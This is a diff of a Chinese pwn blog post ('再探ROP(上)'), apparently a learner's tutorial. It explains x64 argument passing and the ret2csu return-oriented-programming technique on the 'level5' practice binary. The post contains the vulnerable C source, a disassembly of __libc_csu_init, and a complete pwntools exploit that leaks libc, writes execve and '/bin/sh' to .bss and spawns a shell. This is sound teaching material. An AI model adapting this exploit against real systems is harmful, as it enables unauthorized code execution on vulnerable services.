@@ -85,7 +85,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="二进制安全,pwn,栈溢出," />
 
 
 
@@ -96,17 +96,30 @@
 
 
 
-<meta name="description" content="我的征途是星辰大海">
-<meta name="keywords" content="ThreePwn">
-<meta property="og:type" content="website">
-<meta property="og:title" content="ThreePwn&#39;s Blog">
-<meta property="og:url" content="http://1234xxh.github.io/tags/格式化字符串漏洞/index.html">
+<meta name="description" content="毕设和论文要搞吐了，先更新一部分">
+<meta name="keywords" content="二进制安全,pwn,栈溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="再探ROP(上)">
+<meta property="og:url" content="http://1234xxh.github.io/2020/04/07/1/index.html">
 <meta property="og:site_name" content="ThreePwn&#39;s Blog">
-<meta property="og:description" content="我的征途是星辰大海">
+<meta property="og:description" content="毕设和论文要搞吐了，先更新一部分">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://1234xxh.github.io/image/N2LL/11.jpg">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200407/1.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200407/2.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200407/3.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200407/4.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200407/5.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200407/6.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200407/7.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200407/8.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200407/9.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200407/10.png">
+<meta property="og:updated_time" content="2020-04-07T06:48:06.563Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ThreePwn&#39;s Blog">
-<meta name="twitter:description" content="我的征途是星辰大海">
+<meta name="twitter:title" content="再探ROP(上)">
+<meta name="twitter:description" content="毕设和论文要搞吐了，先更新一部分">
+<meta name="twitter:image" content="http://1234xxh.github.io/image/N2LL/11.jpg">
 
 
 
@@ -136,13 +149,13 @@
 
 
 
-  <link rel="canonical" href="http://1234xxh.github.io/tags/格式化字符串漏洞/"/>
+  <link rel="canonical" href="http://1234xxh.github.io/2020/04/07/1/"/>
 
 
 
 
 
-  <title>Tag: 格式化字符串漏洞 | ThreePwn's Blog</title>
+  <title>再探ROP(上) | ThreePwn's Blog</title>
   
 
 
@@ -163,7 +176,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <!-- <div class="headband"></div> -->
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -291,54 +304,284 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>格式化字符串漏洞<small>Tag</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://1234xxh.github.io/2020/04/07/1/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ThreePwn">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/background.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ThreePwn's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/11/05/1/" itemprop="url">
-              
-                <span itemprop="name">深入解析sprintf格式化字符串漏洞</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">再探ROP(上)</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-11-05T20:10:19+08:00"
-              content="2018-11-05" >
-          11-05
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-07T14:00:38+08:00">
+                2020-04-07
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/04/07/1/" class="leancloud_visitors" data-flag-title="再探ROP(上)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>毕设和论文要搞吐了，先更新一部分</p>
+<p><img src="/image/N2LL/11.jpg" alt="image"><br><a id="more"></a></p>
+<h1 id="0x00-前记"><a href="#0x00-前记" class="headerlink" title="0x00 前记"></a>0x00 前记</h1><blockquote>
+<p>毕设和论文要搞吐了，再加上实习驻场事情，近期又要开始准备HW工作，只能先更新一部分</p>
+</blockquote>
+<h1 id="0x01-从x86到x64"><a href="#0x01-从x86到x64" class="headerlink" title="0x01 从x86到x64"></a>0x01 从x86到x64</h1><blockquote>
+<p>之前的rop都是32bit的程序，由于这篇文章涉及的方法用于64bit的程序，这里先说一下两者的区别，做一下过渡。<br>首先是寄存器传参和堆栈传参的区别，这里以一个例子说明</p>
+</blockquote>
+<p><img src="/image/20200407/1.png" alt="image"></p>
+<blockquote>
+<p>在32bit的程序中，如上图所示，在函数调用前，参数会被依次入栈；然而再64bit的同一个程序中，如下图所示，在函数调用前，参数会被放入寄存器中。两者进入函数后都会依照相应的规则去调用对应的参数，这里说一下x64寄存器使用的顺序：分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数。(如果参数过多会被放在栈中)</p>
+</blockquote>
+<p><img src="/image/20200407/2.png" alt="image"></p>
+<blockquote>
+<p>再提一个小点，虽然价值不大，对于我这种初学者来说更加深了理解，继续看</p>
+</blockquote>
+<p><img src="/image/20200407/3.png" alt="image"><br><img src="/image/20200407/4.png" alt="image"></p>
+<blockquote>
+<p>来看read函数，可以发现刚才说的一样，传参一个是栈，一个寄存器。无论是哪种方式，buf参数最终都会读到栈里面，不一样的只不过是buf的中间传递介质。<br>详细了解请见<a href="https://blog.csdn.net/qq_29343201/article/details/51278798" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/51278798</a></p>
+</blockquote>
+<h1 id="0x02-ret2csu"><a href="#0x02-ret2csu" class="headerlink" title="0x02 ret2csu"></a>0x02 ret2csu</h1><blockquote>
+<p>经过一番知识铺垫，那么现在开始进入正题<br>使用蒸米师傅的例子</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void vulnerable_function() &#123;</span><br><span class="line">    char buf[128];</span><br><span class="line">    read(STDIN_FILENO, buf, 512);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>我们先分析一下再去验证<br>题目的前提：<br>1、X64程序，寄存器传参<br>2、程序中找不到system()等可利用函数和”/bin/sh”类似的字符串<br>3、使用ROPgadget无法找到可利用的片段，具体可以见<a href="http://bey0nd.xyz/2020/03/15/1/#ret2syscall" target="_blank" rel="noopener">初探ROP</a> 中的ret2syscall章节</p>
+</blockquote>
+<blockquote>
+<p>按照以往（上一篇文章）的手法，针对于前提2，我们使用ret2libc进行绕过，具体详见<a href="http://bey0nd.xyz/2020/03/15/1/#ret2libc" target="_blank" rel="noopener">初探ROP</a> 中的ret2libc章节的第三种情况，但是忽略了一点X64是寄存器传参，那么system()或者execve()函数的参数在寄存器保存着，那么怎么给寄存器赋予响应的值呢？很简单，类似ret2syscall手法，进行一系列出栈操作即可(达到mov的目的)，但是前提3导致我们搜索不到可利用的片段，似乎山穷水尽了，那么我们怎么办呢？<br>这个时候就应该寻找新的利用手法，也就是ret2csu，其实就是利用&lt;__libc_csu_init&gt;，ta是在libc.so里面，一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作，可以说是通用gadgets。<br>来看一下这个神秘的函数</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">0000000000000760 &lt;__libc_csu_init&gt;:</span><br><span class="line"> 760:	41 57                	push   %r15</span><br><span class="line"> 762:	41 56                	push   %r14</span><br><span class="line"> 764:	41 89 ff             	mov    %edi,%r15d</span><br><span class="line"> 767:	41 55                	push   %r13</span><br><span class="line"> 769:	41 54                	push   %r12</span><br><span class="line"> 76b:	4c 8d 25 56 06 20 00 	lea    0x200656(%rip),%r12     </span><br><span class="line"> 772:	55                   	push   %rbp</span><br><span class="line"> 773:	48 8d 2d 56 06 20 00 	lea    0x200656(%rip),%rbp   </span><br><span class="line"> 77a:	53                   	push   %rbx</span><br><span class="line"> 77b:	49 89 f6             	mov    %rsi,%r14</span><br><span class="line"> 77e:	49 89 d5             	mov    %rdx,%r13</span><br><span class="line"> 781:	4c 29 e5             	sub    %r12,%rbp</span><br><span class="line"> 784:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line"> 788:	48 c1 fd 03          	sar    $0x3,%rbp</span><br><span class="line"> 78c:	e8 e7 fd ff ff       	callq  578 &lt;_init&gt;</span><br><span class="line"> 791:	48 85 ed             	test   %rbp,%rbp</span><br><span class="line"> 794:	74 20                	je     7b6 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line"> 796:	31 db                	xor    %ebx,%ebx</span><br><span class="line"> 798:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)</span><br><span class="line"> 79f:	00 </span><br><span class="line"> 7a0:	4c 89 ea             	mov    %r13,%rdx</span><br><span class="line"> 7a3:	4c 89 f6             	mov    %r14,%rsi</span><br><span class="line"> 7a6:	44 89 ff             	mov    %r15d,%edi</span><br><span class="line"> 7a9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)</span><br><span class="line"> 7ad:	48 83 c3 01          	add    $0x1,%rbx</span><br><span class="line"> 7b1:	48 39 dd             	cmp    %rbx,%rbp</span><br><span class="line"> 7b4:	75 ea                	jne    7a0 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line"> 7b6:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line"> 7ba:	5b                   	pop    %rbx</span><br><span class="line"> 7bb:	5d                   	pop    %rbp</span><br><span class="line"> 7bc:	41 5c                	pop    %r12</span><br><span class="line"> 7be:	41 5d                	pop    %r13</span><br><span class="line"> 7c0:	41 5e                	pop    %r14</span><br><span class="line"> 7c2:	41 5f                	pop    %r15</span><br><span class="line"> 7c4:	c3                   	retq   </span><br><span class="line"> 7c5:	90                   	nop</span><br><span class="line"> 7c6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line"> 7cd:	00 00 00</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>刚才巴拉巴拉了不少，这里还是得先明确一下我们使用&lt;__libc_csu_init&gt;的目的：<br>由于寄存器传参的特性，我们需要把相应的参数值保存到相应寄存器中供后续函数进行调用，寄存器存参数的顺序为：rdi,rsi,rdx,rcx,r8,r9，所以我们使用此函数的片段来达到控制寄存器得目的。<br>继续看此神秘函数，能改变上述寄存器的值是这几处，如下图所示：</p>
+</blockquote>
+<p><img src="/image/20200407/5.png" alt="image"></p>
+<blockquote>
+<p>既然有了可以控制点，那么就想办法怎么去利用？简单画一下流程，能够更好理解是怎么利用。</p>
+</blockquote>
+<p><img src="/image/20200407/6.png" alt="image"></p>
+<blockquote>
+<p>能够通过栈溢出得直接控制点就是几个出栈得地方，可以发现通过这几条指令可以完美的控制寄存器得值，然后通过后续程序可以间接控制参数寄存器得值。<br>因为gadgets一般选择ret结尾得片段，这样可以达到控制程序执行的目的。这里只要将堆栈中h中值填为0x7a0，即可继续执行下一段gadgets，通过mov指令间接控制了rsi，rdx、rdi寄存器<br>继续往下看</p>
+</blockquote>
+<p><img src="/image/20200407/7.png" alt="image"></p>
+<blockquote>
+<p>刚才通过控制控制rip的值使得程序从mov %r13 %rdx处继续执行，在②处对两个参数寄存器进行了传值，然后进行调用函数，由于callq指令的性质，此函数的地址根据*(%r12,%rbx,8)的值来寻找，也就是找到X的地方进行执行，之后两次ret进行控制rip寄存器，也就是继续掌控程序执行的下条指令的位置所在。<br>通过以上分析，可以发现此ROP链能够完成一个强大的功能，那就是可以完成一个函数的调用。<br>根据上一篇文章所提到的ret2libc的第三种利用方式，可以通过write或者put等一系列打印性质的函数读出某个函数的got表内容，从而确定libc中system或者execve等执行性质函数的位置所在，进而达到getshell的目的。<br>当然这只是理想情况，为什么这么说呢？<br>回到&lt;__libc_csu_init&gt;中</p>
+</blockquote>
+<p><img src="/image/20200407/8.png" alt="image"></p>
+<blockquote>
+<p>两个gadgets之间还有一个jne条状，也就是说如果ZF=1(%rbx==%rbp)，那么就不会跳转，按照我们刚才设计的顺序去执行。所以我们再刚才的基础上再去控制一下ZF=1即可。简单陈列一下条件：<br>一、r13和r12寄存器中需要从栈中读到所需要参数的位置，进而可以控制rdx和rsi寄存器的值<br>二、让rbx的值为0(当然也可以不为0，只是这样构造函数的地址方便)，那么*(%r12,%rbx,8)就成了*%r12，只需要让r12寄存器从栈中读到所需要函数的地址即可。<br>三、为了让ZF=1，也就是rbp和rbx寄存器的值相等，既然rbx已经为0了，通过add指令到达cmp比较时它为1，因此rbp也需要为1，让rbx寄存器从栈中读取1即可。<br>以上三个条件完成后，此ROP链配合上栈溢出漏洞就可以轻松地完成某一函数地调用过程了。<br>其实明白了ret2csu地原理，上述地例子地做法就很灵活了，我们再来分析：<br>一、存在栈溢出漏洞<br>二、可以一条完成任意函数功能的ROP链<br>三、条件二完成，我们依然可以控制程序的执行<br>有了这三个条件，做法的灵活性就体现出来，比如可以执行完write函数泄露write的GOT表地址后再去执行main()或者_start函数继续构造栈中内容执行execve达到getshell的目的。<br>这里使用上述方法，基础内容不再赘述，详细可以见上一篇文章(初探ROP)来了解。<br>通过gdb调试可以计算出偏移是0x80+0x8</p>
+</blockquote>
+<p><img src="/image/20200407/9.png" alt="image"></p>
+<blockquote>
+<p>这里有一点还是盲区：callq *(%r12,%rbx,8)这一指令是间接调用函数，类似于它访问是一个指针，一个指向真实目的的指针。因为后续需要调用execve函数，但是我们需要提供指向其地址的指针的地址，所以用bss段的空间进行保存，如下图所示，确定堆栈上的构造</p>
+</blockquote>
+<p><img src="/image/20200407/10.png" alt="image"></p>
+<blockquote>
+<p>根据以上构造给出exp(个人不习惯用LibcSearcher)</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">level5 = ELF(&apos;./level5&apos;)</span><br><span class="line">sh = process(&apos;./level5&apos;)</span><br><span class="line">libc = level5.libc</span><br><span class="line"></span><br><span class="line">write_got = level5.got[&apos;write&apos;]</span><br><span class="line">read_got = level5.got[&apos;read&apos;]</span><br><span class="line">main_addr = level5.symbols[&apos;main&apos;]</span><br><span class="line">bss_base = level5.bss()</span><br><span class="line">csu_front_addr = 0x4005e0</span><br><span class="line">csu_end_addr = 0x4005fa</span><br><span class="line">fakeebp = &apos;b&apos; * 8</span><br><span class="line"></span><br><span class="line">def csu(rbx, rbp, r12, r13, r14, r15, last):</span><br><span class="line">    payload = &apos;a&apos; * 0x80 + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += &apos;a&apos; * 0x38</span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(1)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;Hello, World\n&apos;)</span><br><span class="line">csu(0, 1, write_got, 8, write_got, 1, main_addr)</span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(8))</span><br><span class="line">print hex(write_addr)</span><br><span class="line">libc.address = write_addr - libc.symbols[&apos;write&apos;]</span><br><span class="line">execve_addr = libc.symbols[&apos;execve&apos;]</span><br><span class="line">log.success(&apos;execve_addr &apos; + hex(execve_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;Hello, World\n&apos;)</span><br><span class="line">csu(0, 1, read_got, 16, bss_base, 0, main_addr)</span><br><span class="line">sh.send(p64(execve_addr) + &apos;/bin/sh\0&apos;)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;Hello, World\n&apos;)</span><br><span class="line">csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="0x03-尾记"><a href="#0x03-尾记" class="headerlink" title="0x03 尾记"></a>0x03 尾记</h1><blockquote>
+<p>还未入门，详细记录每个知识点，为了能更好地温故知新，也希望能帮助和我一样想要入门二进制安全的初学者，如有错误，希望大佬们指出。</p>
+</blockquote>
 
       
     </div>
+	<div>
+      
+          <div>
+     
+        <div style="text-align:center;color: #ccc;font-size:15px;">
+              -------------本文结束&感谢您的阅读-------------
+        </div>
+</div>
+      
+	</div>
+    
+    
+    
 
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    ThreePwn
+  </li>
+    <li class="post-copyright-author">
+    <strong>Post title:</strong>
+    <a href="/2020/04/07/1/">再探ROP(上)</a>
+  </li>
+  <li class="post-copyright-author">
+    <strong>Publishing time:</strong>
+    2020年04月07日 - 14:04
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="http://1234xxh.github.io/2020/04/07/1/" title="再探ROP(上)">http://1234xxh.github.io/2020/04/07/1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+  <li>转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/二进制安全/" rel="tag"># 二进制安全</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/25/1/" rel="next" title="不一样的整数溢出">
+                <i class="fa fa-chevron-left"></i> 不一样的整数溢出
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -346,6 +589,15 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zODU3Ni8xNTEwNA=="></div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -366,8 +618,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -476,6 +737,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-前记"><span class="nav-number">1.</span> <span class="nav-text">0x00 前记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-从x86到x64"><span class="nav-number">2.</span> <span class="nav-text">0x01 从x86到x64</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-ret2csu"><span class="nav-number">3.</span> <span class="nav-text">0x02 ret2csu</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-尾记"><span class="nav-number">4.</span> <span class="nav-text">0x03 尾记</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -650,6 +927,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -678,6 +959,17 @@
 
 
 
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
   
 
 
@@ -1181,28 +1473,25 @@
   </script>
 
   
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: 12981,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
+  </script>
+
 
   
-  
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-        tex2jax: {
-          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-          processEscapes: true,
-          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-        }
-      });
-    </script>
-
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for (i=0; i < all.length; i += 1) {
-          all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-      });
-    </script>
-    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
   
 
 
